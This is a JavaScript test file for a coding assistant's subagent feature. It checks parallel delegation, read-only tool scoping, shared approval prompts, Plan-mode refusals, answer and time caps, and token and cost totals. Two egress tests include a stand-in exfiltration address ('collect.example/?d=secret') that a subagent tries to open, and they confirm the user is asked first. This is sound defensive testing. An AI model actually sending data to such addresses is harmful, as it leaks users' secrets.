'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { createToolLoop, PLAN_REFUSAL } = require('../lib/tool-loop.cjs');
const { createSubagents, scopedSource, taskOf, MAX_ANSWER_BYTES } = require('../lib/subagents.cjs');
const { combineToolSources, createWorkspaceTools } = require('../lib/workspace-tools.cjs');
const { createWorkspace } = require('../lib/workspace.cjs');
const { createCheckpoints } = require('../lib/checkpoints.cjs');
const { createMetrics } = require('../lib/metrics.cjs');
const { createProvider } = require('../lib/provider.cjs');

const PARENT = 'r1';
const INPUT = Object.freeze({ requestId: PARENT, systemPrompt: 'Be helpful.', messages: [{ role: 'user', content: 'Look into it' }] });
const USAGE = Object.freeze({ prompt_tokens: 10, completion_tokens: 2, total_tokens: 12 });

function toolCall(id, name, args = {}) {
  return { id, name, arguments: typeof args === 'string' ? args : JSON.stringify(args) };
}
function toolReply(calls, extra = {}) {
  return { content: null, toolCalls: calls, model: 'm1', finishReason: 'tool_calls', ...extra };
}
function textReply(content, extra = {}) {
  return { content, toolCalls: [], model: 'm1', finishReason: 'stop', ...extra };
}
function agentCall(id, description, prompt, kind = 'explore') {
  return toolCall(id, 'agent_task', { description, prompt, kind });
}
const hang = () => new Promise(() => {});
const tick = () => new Promise((resolve) => setImmediate(resolve));

// The model. The reply's rounds come from `parent`, in order; a subagent's from `agents[brief]`
// (by the brief it was given), in order. A function reply receives the request and options.
function fakeProvider({ parent = [], agents = {}, snapshots = false } = {}) {
  const queues = new Map([[PARENT, [...parent]]]);
  const calls = { complete: [], options: [], cancel: [] };
  const briefOf = (request) => request.messages.find((message) => message.role === 'user')?.content;
  const next = (queue, request, options) => {
    const item = queue.length > 1 ? queue.shift() : queue[0];
    return typeof item === 'function' ? item(request, options) : structuredClone(item);
  };
  const provider = {
    calls,
    async send() {
      return { text: 'plain', model: 'm-plain' };
    },
    async complete(request, options = {}) {
      calls.complete.push(structuredClone(request));
      calls.options.push(options);
      if (request.requestId === PARENT) return next(queues.get(PARENT), request, options);
      const brief = briefOf(request);
      if (!queues.has(brief)) queues.set(brief, [...(agents[brief] || [textReply('Nothing to report.')])]);
      return next(queues.get(brief), request, options);
    },
    cancel(id) {
      calls.cancel.push(id);
      return false;
    },
  };
  if (snapshots) {
    provider.snapshot = () => ({ model: 'm1', models: [{ id: 'm1' }, { id: 'm-small' }] });
    provider.snapshotFor = (base, model) => (base.models.some((item) => item.id === model) ? { ...base, model } : null);
  }
  return provider;
}

// A built-in tool source like lib/workspace-tools.cjs: `tools` are { name, toolName, ...target }.
function fakeSource(serverId, tools, log) {
  return {
    SERVER_ID: serverId,
    definitions: () => tools.map((tool) => ({ type: 'function', function: { name: tool.name, description: tool.toolName, parameters: { type: 'object', properties: {} } } })),
    resolve(name) {
      const tool = tools.find((item) => item.name === name);
      if (!tool) return null;
      const { name: _name, ...target } = tool;
      return { serverId, ...target };
    },
    async call(toolName, args) {
      log.push(`${serverId}.${toolName}`);
      return { text: `${toolName}:ok` };
    },
  };
}

// The reply's tools wired the way main does (combineToolSources): reads, writes, a command that
// asks outside the sandbox, the web with its address check, the clipboard, the to-do list and
// agent_task.
function setup({ provider, approve = null, options = {}, builtins = null } = {}) {
  const log = [];
  const subagents = createSubagents({ provider, approve, ...options });
  const sources = builtins ? [...builtins, subagents] : [
    fakeSource('Workspace', [
      { name: 'workspace_read', toolName: 'read_file', readOnly: true },
      { name: 'workspace_write', toolName: 'write_file', readOnly: false },
      { name: 'workspace_run', toolName: 'run_command', readOnly: false, alwaysAsk: (args) => (args.sandbox === false ? 'unsandboxed' : '') },
    ], log),
    fakeSource('Web', [
      { name: 'web_search', toolName: 'search', readOnly: true },
      { name: 'web_open', toolName: 'open_page', readOnly: true, egressUrl: (args) => (typeof args.url === 'string' ? args.url : null) },
    ], log),
    fakeSource('Computer', [{ name: 'computer_clipboard_read', toolName: 'read_clipboard', readOnly: true, private: true }], log),
    fakeSource('Todos', [{ name: 'todo_write', toolName: 'todo_write', readOnly: true, exclusive: true }], log),
    subagents,
  ];
  const source = combineToolSources({
    builtins: sources,
    mcp: { async chatTools() { return { tools: [], resolve: () => null, errors: [] }; }, async callTool() { throw new Error('no mcp'); } },
  });
  const loop = createToolLoop({ provider, mcp: source, approve });
  return { loop, source, log, subagents };
}

const toolNames = (request) => request.tools.map((tool) => tool.function.name);
const toolMessages = (request) => request.messages.filter((message) => message.role === 'tool');
const agentRequests = (provider) => provider.calls.complete.filter((request) => request.requestId !== PARENT);
const requestsFor = (provider, brief) => agentRequests(provider).filter((request) => request.messages[1]?.content === brief);

test('agent_task is offered with its brief, and checks what the model asks for', () => {
  const { subagents } = setup({ provider: fakeProvider() });
  const [definition] = subagents.definitions();
  assert.equal(definition.function.name, 'agent_task');
  assert.deepEqual(definition.function.parameters.required, ['description', 'prompt', 'kind']);
  assert.deepEqual(definition.function.parameters.properties.kind.enum, ['explore', 'general']);
  const target = subagents.resolve('agent_task');
  assert.equal(target.serverId, 'Agents');
  assert.equal(target.readOnly, true, 'it changes nothing itself, so it runs side by side and in Plan');
  assert.equal(typeof target.delegate, 'function');
  assert.equal(subagents.resolve('other'), null);
  assert.equal(subagents.describeCall('agent_task', { description: ' Find\nthe parser ' }), 'Subagent: Find the parser');
  assert.deepEqual(taskOf({ description: 'Look', prompt: ' Read it. ' }), { description: 'Look', prompt: 'Read it.', kind: 'explore' }, 'no kind: it only reads');
  assert.throws(() => taskOf({ prompt: 'x' }), /description/);
  assert.throws(() => taskOf({ description: 'x', prompt: '  ' }), /brief/);
  assert.throws(() => taskOf({ description: 'x', prompt: 'y', kind: 'admin' }), /explore/);
  assert.throws(() => taskOf({ description: 'x', prompt: 'y'.repeat(33 * 1024) }), /32 KB/);
  assert.equal(taskOf({ description: 'd'.repeat(200), prompt: 'y' }).description.length, 80);
  return assert.rejects(subagents.call('agent_task', {}), { code: 'NO_REPLY' });
});

test('several agent_task calls of one round run at the same time, each with a fresh conversation', { timeout: 5000 }, async () => {
  let started = 0;
  let release;
  const gate = new Promise((resolve) => { release = resolve; });
  // Each subagent waits until all three have started: run one after another, this never ends.
  const answer = (text) => async () => {
    started += 1;
    if (started === 3) release();
    await gate;
    return textReply(text, { usage: USAGE });
  };
  const provider = fakeProvider({
    parent: [
      toolReply([
        agentCall('a1', 'Find the parser', 'Find where the parser lives.'),
        agentCall('a2', 'Find the tests', 'Find the parser tests.'),
        agentCall('a3', 'Read the guide', 'Read the contributing guide.'),
      ]),
      textReply('All found.'),
    ],
    agents: {
      'Find where the parser lives.': [answer('src/parser.js:12')],
      'Find the parser tests.': [answer('test/parser.test.js')],
      'Read the contributing guide.': [answer('Use npm test.')],
    },
  });
  const { loop } = setup({ provider });
  const result = await loop.send({ ...INPUT }, { permission: 'basic' });
  assert.equal(result.text, 'All found.');
  // The answers come back in the order the model wrote the calls, with a short footer.
  const final = provider.calls.complete.at(-1);
  assert.equal(final.requestId, PARENT);
  const contents = toolMessages(final).map((message) => message.content);
  assert.deepEqual(contents.map((content) => content.split('\n\n')[0]), ['src/parser.js:12', 'test/parser.test.js', 'Use npm test.']);
  for (const content of contents) assert.match(content, /\n\n\[Subagent finished: 1 round · 12 tokens\]$/);
  // Each subagent had its own request id and a fresh conversation: instructions and the brief only.
  const requests = agentRequests(provider);
  assert.equal(requests.length, 3);
  assert.equal(new Set(requests.map((request) => request.requestId)).size, 3);
  for (const request of requests) {
    assert.match(request.requestId, /^agent-[0-9a-f-]{36}$/);
    assert.equal(request.messages.length, 2);
    assert.equal(request.messages[0].role, 'system');
    assert.match(request.messages[0].content, /You are a subagent/);
    assert.match(request.messages[0].content, /Kind: explore/);
    assert.ok(!JSON.stringify(request.messages).includes('Look into it'), 'the reply\'s conversation stays out');
  }
  // The steps keep each subagent's work with its call.
  assert.deepEqual(result.steps.map((step) => [step.title, step.ok, step.agent?.status, step.agent?.kind]), [
    ['Subagent: Find the parser', true, 'done', 'explore'],
    ['Subagent: Find the tests', true, 'done', 'explore'],
    ['Subagent: Read the guide', true, 'done', 'explore'],
  ]);
});

test('at most three subagents of a reply run at once; the others wait for a free place', { timeout: 5000 }, async () => {
  let running = 0;
  let most = 0;
  const work = async () => {
    running += 1;
    most = Math.max(most, running);
    await new Promise((resolve) => setTimeout(resolve, 20));
    running -= 1;
    return textReply('done');
  };
  const briefs = ['One.', 'Two.', 'Three.', 'Four.'];
  const provider = fakeProvider({
    parent: [toolReply(briefs.map((brief, index) => agentCall(`a${index}`, `Part ${index}`, brief))), textReply('ok')],
    agents: Object.fromEntries(briefs.map((brief) => [brief, [work]])),
  });
  const { loop } = setup({ provider });
  const events = [];
  const result = await loop.send({ ...INPUT }, { permission: 'bypass', onProgress: (event) => events.push(event) });
  assert.equal(result.text, 'ok');
  assert.equal(most, 3);
  assert.equal(agentRequests(provider).length, 4, 'the fourth ran once a place was free');
  // The tool loop runs four read-only calls side by side; the fourth subagent said it was waiting.
  assert.equal(events.filter((event) => event.phase === 'subagent' && event.status === 'queued').length, 1);
  assert.equal(events.filter((event) => event.phase === 'subagent' && event.status === 'done').length, 4);
});

test('an explore subagent gets the read-only tools only; no subagent gets agent_task', async () => {
  const misuse = [
    toolCall('s1', 'workspace_write', { path: 'a.txt', content: 'x' }),
    agentCall('s2', 'Go deeper', 'Nested.'),
    toolCall('s3', 'computer_clipboard_read'),
    toolCall('s4', 'todo_write', { todos: [] }),
    toolCall('s5', 'workspace_read', { path: 'a.txt' }),
  ];
  const provider = fakeProvider({
    parent: [
      toolReply([agentCall('a1', 'Look around', 'Look around.', 'explore'), agentCall('a2', 'Change things', 'Change things.', 'general')]),
      textReply('done'),
    ],
    agents: {
      'Look around.': [toolReply(misuse), textReply('looked')],
      'Change things.': [toolReply([misuse[0], misuse[1], misuse[4]]), textReply('changed')],
    },
  });
  const { loop, log } = setup({ provider });
  await loop.send({ ...INPUT }, { permission: 'bypass' });
  const [explore, exploreAfter] = requestsFor(provider, 'Look around.');
  const [general, generalAfter] = requestsFor(provider, 'Change things.');
  assert.deepEqual(toolNames(explore), ['workspace_read', 'web_search', 'web_open']);
  assert.deepEqual(toolNames(general), ['workspace_read', 'workspace_write', 'workspace_run', 'web_search', 'web_open', 'computer_clipboard_read', 'todo_write']);
  assert.match(general.messages[0].content, /Kind: general/);
  // Called by name anyway, a tool left out is unknown: nothing ran but the read (and the general write).
  const exploreAnswers = toolMessages(exploreAfter).map((message) => message.content);
  assert.deepEqual(exploreAnswers, ['Error: unknown tool', 'Error: unknown tool', 'Error: unknown tool', 'Error: unknown tool', 'read_file:ok']);
  const generalAnswers = toolMessages(generalAfter).map((message) => message.content);
  assert.deepEqual(generalAnswers, ['write_file:ok', 'Error: unknown tool', 'read_file:ok']);
  assert.deepEqual(log.sort(), ['Workspace.read_file', 'Workspace.read_file', 'Workspace.write_file']);
  // The scope is checked again when a tool is resolved, whatever the catalog said.
  const scoped = scopedSource({
    chatTools: async () => ({ tools: [], resolve: (name) => ({ serverId: 'X', toolName: name, readOnly: name === 'r', private: name === 'p' }) }),
    callTool: async () => ({ text: '' }),
  }, 'explore');
  const catalog = await scoped.chatTools({});
  assert.equal(catalog.resolve('w'), null);
  assert.equal(catalog.resolve('p'), null);
  assert.equal(catalog.resolve('r').toolName, 'r');
});

test('the answer handed back is capped at 16 KB, the rounds at the limit, and the time too', { timeout: 5000 }, async () => {
  const long = 'x'.repeat(20 * 1024);
  const provider = fakeProvider({
    parent: [
      toolReply([agentCall('a1', 'Write a lot', 'Write a lot.'), agentCall('a2', 'Never stop', 'Never stop.'), agentCall('a3', 'Hang', 'Hang.')]),
      textReply('done'),
    ],
    agents: {
      'Write a lot.': [textReply(long, { usage: USAGE })],
      // Calls a tool every time: the loop stops it at its round limit with one answer without tools.
      'Never stop.': [(request) => (request.tools.length ? toolReply([toolCall(`c${request.messages.length}`, 'workspace_read')]) : textReply('stopped at the limit'))],
      'Hang.': [hang],
    },
  });
  const { loop } = setup({ provider, options: { maxRounds: 3, timeoutMs: 50 } });
  const events = [];
  const result = await loop.send({ ...INPUT }, { permission: 'bypass', onProgress: (event) => events.push(event) });
  const [capped, limited, timedOut] = toolMessages(provider.calls.complete.at(-1)).map((message) => message.content);
  const [answer, footer] = capped.split('\n\n');
  assert.ok(Buffer.byteLength(answer) <= MAX_ANSWER_BYTES);
  assert.match(answer, /\n\[ScaleMax cut the subagent's answer here, at 16 KB\.\]$/);
  assert.equal(footer, '[Subagent finished: 1 round · 12 tokens]');
  assert.match(limited, /^stopped at the limit\n\n\[Subagent finished: 4 rounds\]$/);
  const neverStop = requestsFor(provider, 'Never stop.');
  assert.equal(neverStop.length, 4);
  assert.deepEqual(neverStop.at(-1).tools, [], 'the last round answers without tools');
  assert.match(timedOut, /^Error: The subagent "Hang" did not finish: it ran out of time after 1 second\./);
  const [hung] = requestsFor(provider, 'Hang.');
  assert.ok(provider.calls.cancel.includes(hung.requestId), 'its model call was cancelled');
  const status = events.find((event) => event.phase === 'subagent' && event.description === 'Hang' && event.status === 'failed');
  assert.match(status.error, /ran out of time/);
  assert.equal(result.steps[2].ok, false);
  assert.equal(result.steps[2].agent.status, 'failed');
});

test('Stop on the reply stops its subagents, waiting ones too, and keeps what they used', { timeout: 5000 }, async () => {
  let reached;
  const started = new Promise((resolve) => { reached = resolve; });
  const provider = fakeProvider({
    parent: [toolReply([agentCall('a1', 'Slow one', 'Slow.'), agentCall('a2', 'Next one', 'Next.')])],
    agents: {
      'Slow.': [
        toolReply([toolCall('c1', 'workspace_read')], { usage: USAGE }),
        () => { reached(); return hang(); },
      ],
      'Next.': [textReply('never asked')],
    },
  });
  const { loop } = setup({ provider, options: { maxRunning: 1 } });
  const events = [];
  const reply = loop.send({ ...INPUT }, { permission: 'bypass', onProgress: (event) => events.push(event) });
  await started;
  assert.ok(events.some((event) => event.phase === 'subagent' && event.description === 'Next one' && event.status === 'queued'));
  assert.equal(loop.cancel(PARENT), true);
  const error = await reply.then(() => null, (failure) => failure);
  assert.equal(error.code, 'CANCELLED');
  await tick();
  const slow = agentRequests(provider)[0];
  assert.ok(provider.calls.cancel.includes(slow.requestId), 'the running subagent\'s model call was cancelled');
  assert.equal(requestsFor(provider, 'Next.').length, 0, 'the waiting one never started');
  // The subagent's billed round is in the reply's usage, Stop or not.
  assert.deepEqual(error.usageSnapshot.usage, USAGE);
  assert.equal(error.usageSnapshot.incomplete, true);
});

test('a subagent\'s calls ask through the reply\'s prompt, labelled, and share its "Allow all"', async () => {
  const asked = [];
  const approve = async (request) => {
    asked.push(request);
    return request.reason ? 'once' : 'request';
  };
  const provider = fakeProvider({
    parent: [
      toolReply([agentCall('a1', 'Fix the docs', 'Fix the docs.', 'general')]),
      toolReply([toolCall('p1', 'workspace_write', { path: 'b.md' })]),
      textReply('done'),
    ],
    agents: {
      'Fix the docs.': [
        toolReply([toolCall('c1', 'workspace_write', { path: 'a.md' })]),
        toolReply([toolCall('c2', 'workspace_write', { path: 'c.md' }), toolCall('c3', 'workspace_run', { command: 'git commit', sandbox: false })]),
        textReply('fixed'),
      ],
    },
  });
  const { loop, log } = setup({ provider, approve });
  const result = await loop.send({ ...INPUT }, { permission: 'basic' });
  assert.equal(result.text, 'done');
  // The first write asked, labelled with the subagent and the reply's own id; "Allow all" then
  // covered the subagent's next write and the reply's own, but not the command outside the sandbox.
  assert.deepEqual(asked.map((request) => [request.requestId, request.subagent, request.toolName, request.reason || '']), [
    [PARENT, 'Fix the docs', 'write_file', ''],
    [PARENT, 'Fix the docs', 'run_command', 'unsandboxed'],
  ]);
  assert.deepEqual(log, ['Workspace.write_file', 'Workspace.write_file', 'Workspace.run_command', 'Workspace.write_file']);
  // The other way round: "Allow all" given to the reply covers its subagents.
  const later = [];
  const provider2 = fakeProvider({
    parent: [
      toolReply([toolCall('p1', 'workspace_write', { path: 'b.md' })]),
      toolReply([agentCall('a1', 'More docs', 'More docs.', 'general')]),
      textReply('done'),
    ],
    agents: { 'More docs.': [toolReply([toolCall('c1', 'workspace_write', { path: 'a.md' })]), textReply('fixed')] },
  });
  await setup({ provider: provider2, approve: async (request) => { later.push(request); return 'request'; } }).loop.send({ ...INPUT }, { permission: 'basic' });
  assert.deepEqual(later.map((request) => request.subagent || ''), [''], 'only the reply\'s own write asked');
  // Without an approver nothing that needs one runs.
  const provider3 = fakeProvider({
    parent: [toolReply([agentCall('a1', 'Write', 'Write.', 'general')]), textReply('done')],
    agents: { 'Write.': [toolReply([toolCall('c1', 'workspace_write')]), textReply('could not')] },
  });
  const quiet = setup({ provider: provider3 });
  await quiet.loop.send({ ...INPUT }, { permission: 'basic' });
  assert.match(toolMessages(agentRequests(provider3).at(-1))[0].content, /needs the user's approval/);
  assert.deepEqual(quiet.log, []);
});

test('in Plan a subagent runs but cannot change anything, and is told so', async () => {
  const asked = [];
  const provider = fakeProvider({
    parent: [toolReply([agentCall('a1', 'Try a change', 'Try a change.', 'general')]), textReply('planned')],
    agents: { 'Try a change.': [toolReply([toolCall('c1', 'workspace_write'), toolCall('c2', 'workspace_read')]), textReply('could not change it')] },
  });
  const { loop, log } = setup({ provider, approve: async (request) => { asked.push(request); return 'once'; } });
  const result = await loop.send({ ...INPUT }, { permission: 'plan' });
  assert.equal(result.text, 'planned');
  const [first, second] = agentRequests(provider);
  assert.match(first.messages[0].content, /Plan permission/);
  assert.deepEqual(toolMessages(second).map((message) => message.content), [PLAN_REFUSAL, 'read_file:ok']);
  assert.deepEqual(asked, [], 'nothing to approve');
  assert.deepEqual(log, ['Workspace.read_file']);
});

test('an address in the brief the reply was not given asks before a subagent opens it', async () => {
  const asked = [];
  const given = 'https://docs.example.com/guide';
  const madeUp = 'https://collect.example/?d=secret';
  const brief = `Read ${given} and then ${madeUp}`;
  const provider = fakeProvider({
    parent: [toolReply([agentCall('a1', 'Read pages', brief)]), textReply('done')],
    agents: { [brief]: [toolReply([toolCall('c1', 'web_open', { url: given }), toolCall('c2', 'web_open', { url: madeUp })]), textReply('read')] },
  });
  const { loop } = setup({ provider, approve: async (request) => { asked.push(request); return 'deny'; } });
  await loop.send({ ...INPUT, messages: [{ role: 'user', content: `Summarise ${given}` }] }, { permission: 'basic' });
  assert.deepEqual(asked.map((request) => [request.reason, request.host, request.subagent]), [['egress', 'collect.example', 'Read pages']]);
  assert.deepEqual(toolMessages(agentRequests(provider)[1]).map((message) => message.content.slice(0, 20)), ['open_page:ok', 'Error: the user deni']);
});

test('an address in a subagent\'s answer is its own writing, not a given one, for the reply', async () => {
  const asked = [];
  const given = 'https://docs.example.com/guide';
  const madeUp = 'https://collect.example/?d=secret';
  const provider = fakeProvider({
    parent: [
      toolReply([agentCall('a1', 'Find pages', 'Find the pages.')]),
      toolReply([toolCall('p1', 'web_open', { url: given }), toolCall('p2', 'web_open', { url: madeUp })]),
      textReply('done'),
    ],
    agents: { 'Find the pages.': [textReply(`See ${given} and ${madeUp}`)] },
  });
  const { loop, log } = setup({ provider, approve: async (request) => { asked.push(request); return 'deny'; } });
  await loop.send({ ...INPUT, messages: [{ role: 'user', content: `Start from ${given}` }] }, { permission: 'basic' });
  // Echoed back as the call's result, the made-up address still asks; the given one does not.
  assert.deepEqual(asked.map((request) => [request.reason, request.host, request.subagent || '']), [['egress', 'collect.example', '']]);
  assert.deepEqual(log, ['Web.open_page']);
});

test('what a subagent changes is recorded with the reply\'s changes', async (t) => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'sm-agents-project-')));
  const store = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'sm-agents-store-')));
  t.after(() => {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(store, { recursive: true, force: true });
  });
  fs.writeFileSync(path.join(root, 'README.md'), '# Demo\n');
  const workspace = createWorkspace({ approve: async () => true });
  t.after(() => workspace.dispose());
  await workspace.select(root);
  const checkpoints = createCheckpoints({ dir: store });
  // As main does it (openChatSession): the reply's workspace tools record every change.
  const recorder = checkpoints.recorder({ requestId: PARENT, folder: workspace.current() });
  const tools = createWorkspaceTools({ getWorkspace: () => workspace, onChange: (change) => recorder.record(change) });
  const provider = fakeProvider({
    parent: [toolReply([agentCall('a1', 'Write notes', 'Write notes.', 'general')]), textReply('done')],
    agents: {
      'Write notes.': [
        toolReply([toolCall('c1', 'workspace_write', { path: 'notes/todo.md', content: '- ship\n' }), toolCall('c2', 'workspace_edit', { path: 'README.md', old_text: '# Demo', new_text: '# Demo app' })]),
        textReply('Wrote notes/todo.md and renamed the title.'),
      ],
    },
  });
  const { loop } = setup({ provider, builtins: [tools] });
  const result = await loop.send({ ...INPUT }, { permission: 'bypass' });
  assert.equal(fs.readFileSync(path.join(root, 'notes', 'todo.md'), 'utf8'), '- ship\n');
  assert.deepEqual(recorder.summary().files.map((file) => [file.path, file.status]).sort(), [['README.md', 'changed'], ['notes/todo.md', 'changed']]);
  // The calls it made count in the reply's summary as well.
  assert.deepEqual(result.toolCalls.map((call) => `${call.server}.${call.tool}:${call.ok}`), ['Workspace.write_file:true', 'Workspace.edit_file:true', 'Agents.agent_task:true']);
  assert.deepEqual(result.steps[0].agent.steps.map((step) => [step.title, step.ok]), [['Wrote notes/todo.md', true], ['Edited README.md', true]]);
});

test('a subagent\'s tokens and cost count in the reply\'s totals, on its own model if set', async () => {
  const priced = (model) => ({ currency: 'USD', inputPerMillion: model === 'm-small' ? 1 : 10, outputPerMillion: model === 'm-small' ? 2 : 20 });
  const reply = (make) => (request, options) => ({ ...make(), model: options.snapshot?.model || 'm1', pricing: priced(options.snapshot?.model), usage: USAGE });
  const build = (modelFor) => {
    const provider = fakeProvider({
      snapshots: true,
      parent: [reply(() => toolReply([agentCall('a1', 'Count', 'Count.')])), reply(() => textReply('done'))],
      agents: { 'Count.': [reply(() => toolReply([toolCall('c1', 'workspace_read')])), reply(() => textReply('counted'))] },
    });
    return { provider, ...setup({ provider, options: { modelFor } }) };
  };
  // The reply's own model: the subagent holds the reply's snapshot, and the totals add up.
  const same = build(null);
  const result = await same.loop.send({ ...INPUT }, { permission: 'bypass' });
  const parentSnapshot = same.provider.calls.options[0].snapshot;
  for (const options of same.provider.calls.options) assert.equal(options.snapshot, parentSnapshot, 'one snapshot for the reply and its subagent');
  assert.deepEqual(result.usage, { prompt_tokens: 40, completion_tokens: 8, total_tokens: 48 });
  assert.equal(result.usageRounds.length, 4);
  const metrics = createMetrics(result);
  assert.equal(metrics.costStatus, 'priced');
  assert.equal(metrics.costNanoUsd, (40 * 10 + 8 * 20) * 1000);
  assert.match(toolMessages(same.provider.calls.complete.at(-1))[0].content, /\[Subagent finished: 2 rounds · 24 tokens\]$/);
  // A model of its own for the kind: priced per round, the total is their sum.
  const small = build((kind) => (kind === 'explore' ? 'm-small' : ''));
  const mixed = await small.loop.send({ ...INPUT }, { permission: 'bypass' });
  const own = small.provider.calls.options.filter((options, index) => small.provider.calls.complete[index].requestId !== PARENT);
  assert.deepEqual(own.map((options) => options.snapshot.model), ['m-small', 'm-small']);
  assert.deepEqual(mixed.usageRounds.map((round) => round.model), ['m1', 'm-small', 'm-small', 'm1']);
  const mixedMetrics = createMetrics(mixed);
  assert.equal(mixedMetrics.costStatus, 'priced');
  assert.equal(mixedMetrics.costNanoUsd, (2 * (10 * 10 + 2 * 20) + 2 * (10 * 1 + 2 * 2)) * 1000);
  // A model the catalog does not have keeps the reply's.
  const unknown = build(() => 'm-missing');
  await unknown.loop.send({ ...INPUT }, { permission: 'bypass' });
  assert.ok(unknown.provider.calls.options.every((options) => options.snapshot.model === 'm1'));
});

test('a subagent reports nested under its step, gathered, without its thinking', async () => {
  const provider = fakeProvider({
    parent: [toolReply([agentCall('a1', 'Look', 'Look.')]), textReply('done')],
    agents: {
      'Look.': [
        (request, options) => {
          options.onDelta?.({ type: 'reasoning', text: 'secret plan' });
          options.onDelta?.({ type: 'text', text: 'Reading the file.' });
          return toolReply([toolCall('c1', 'workspace_read')], { content: 'Reading the file.', usage: USAGE });
        },
        textReply('Found it.', { usage: USAGE }),
      ],
    },
  });
  const { loop } = setup({ provider });
  const events = [];
  const result = await loop.send({ ...INPUT }, { permission: 'bypass', onProgress: (event) => events.push(event) });
  assert.equal(result.text, 'done');
  const mine = events.filter((event) => event.phase === 'subagent');
  assert.ok(mine.every((event) => event.requestId === PARENT && event.callId === 'step-1'));
  assert.deepEqual(mine[0], { requestId: PARENT, phase: 'subagent', callId: 'step-1', status: 'running', description: 'Look', kind: 'explore' });
  const nested = mine.filter((event) => event.event).map((event) => event.event);
  assert.ok(nested.every((event) => !('requestId' in event)));
  assert.deepEqual(nested.map((event) => event.phase).filter((phase) => phase !== 'preparing'), ['thinking', 'delta', 'tool', 'tool-done', 'thinking']);
  assert.equal(nested.find((event) => event.phase === 'delta').text, 'Reading the file.');
  assert.ok(!JSON.stringify(events).includes('secret plan'), 'its thinking stays out of the window');
  assert.equal(nested.find((event) => event.phase === 'tool').callId, 'step-1', 'its own step ids');
  const done = mine.at(-1);
  assert.equal(done.status, 'done');
  assert.equal(done.rounds, 2);
  assert.deepEqual(done.metrics.usage, { inputTokens: 20, outputTokens: 4, totalTokens: 24 });
  // Then the reply's own step ends.
  const after = events.slice(events.indexOf(done) + 1);
  assert.deepEqual(after[0], { requestId: PARENT, phase: 'tool-done', callId: 'step-1', ok: true });
  // Without a listener it is not streamed, and nothing is reported.
  const quiet = fakeProvider({ parent: [toolReply([agentCall('a1', 'Look', 'Look.')]), textReply('done')] });
  await setup({ provider: quiet }).loop.send({ ...INPUT }, { permission: 'bypass' });
  assert.ok(quiet.calls.options.every((options) => !options.onDelta));
});

test('a subagent that fails says so to the reply, and a reply starts sixteen at most', async () => {
  const provider = fakeProvider({
    parent: [toolReply([agentCall('a1', 'Break', 'Break.'), agentCall('a2', 'Fine', 'Fine.'), agentCall('a3', 'Too many', 'Too many.')]), textReply('done')],
    agents: {
      'Break.': [toolReply([toolCall('c1', 'workspace_read')]), () => { throw Object.assign(new Error('The provider is down.'), { code: 'PROVIDER_ERROR' }); }],
    },
  });
  const { loop } = setup({ provider, options: { maxPerReply: 2 } });
  // With a listener: what it did before it failed is kept from what it reported.
  const result = await loop.send({ ...INPUT }, { permission: 'bypass', onProgress: () => {} });
  const [broken, fine, tooMany] = toolMessages(provider.calls.complete.at(-1)).map((message) => message.content);
  assert.match(broken, /^Error: The subagent "Break" did not finish: The provider is down\./);
  assert.match(fine, /^Nothing to report\./);
  assert.match(tooMany, /^Error: This reply already started 2 subagents/);
  assert.equal(result.steps[0].agent.status, 'failed');
  assert.deepEqual(result.steps[0].agent.steps.map((step) => [step.title, step.ok]), [['Workspace · read_file', true]]);
  assert.equal(result.steps[2].agent, undefined);
  // Bad arguments never start one.
  const bad = fakeProvider({ parent: [toolReply([toolCall('a1', 'agent_task', { description: 'x' })]), textReply('done')] });
  await setup({ provider: bad }).loop.send({ ...INPUT }, { permission: 'bypass' });
  assert.match(toolMessages(bad.calls.complete.at(-1))[0].content, /^Error: "prompt" must be the full brief/);
  assert.equal(agentRequests(bad).length, 0);
});

test('the provider gives a subagent its kind\'s model on the reply\'s snapshot, and nothing else', async () => {
  let state = {};
  const store = { readAll: () => structuredClone(state), update(mutator) { const draft = structuredClone(state); const result = mutator(draft); state = result === undefined ? draft : result; return structuredClone(state); } };
  const seen = [];
  const provider = createProvider({
    store,
    approve: async () => true,
    retryDelays: [1, 1, 1],
    fetchImpl: async (url, options = {}) => {
      const body = JSON.parse(options.body);
      seen.push(body.model);
      return new Response(JSON.stringify({ model: body.model, choices: [{ message: { role: 'assistant', content: 'OK' } }], usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 } }), { status: 200, headers: { 'content-type': 'application/json' } });
    },
  });
  await provider.save({
    kind: 'custom', baseUrl: 'http://127.0.0.1:11434/v1', model: 'one',
    models: [
      { id: 'one', pricing: { currency: 'USD', inputPerMillion: 1, outputPerMillion: 2 } },
      { id: 'two', pricing: { currency: 'USD', inputPerMillion: 10, outputPerMillion: 20 } },
    ],
  });
  const frozen = provider.snapshot();
  const other = provider.snapshotFor(frozen, 'two');
  assert.equal(other.model, 'two');
  assert.equal(frozen.model, 'one', 'the reply\'s own snapshot is untouched');
  const result = await provider.complete({ requestId: 'agent-1', messages: [{ role: 'user', content: 'hi' }] }, { snapshot: other });
  assert.deepEqual(seen, ['two']);
  assert.deepEqual(result.pricing, { currency: 'USD', inputPerMillion: 10, outputPerMillion: 20 });
  // Only a model of that catalog, and only from a snapshot the provider handed out.
  assert.equal(provider.snapshotFor(frozen, 'three'), null);
  assert.equal(provider.snapshotFor({ ...frozen }, 'two'), null);
  assert.equal(provider.snapshotFor(frozen, ''), null);
  // It retires with the reply's credentials.
  await provider.clear();
  await assert.rejects(provider.complete({ requestId: 'agent-2', messages: [{ role: 'user', content: 'hi' }] }, { snapshot: other }), { code: 'PROVIDER_CHANGED' });
});
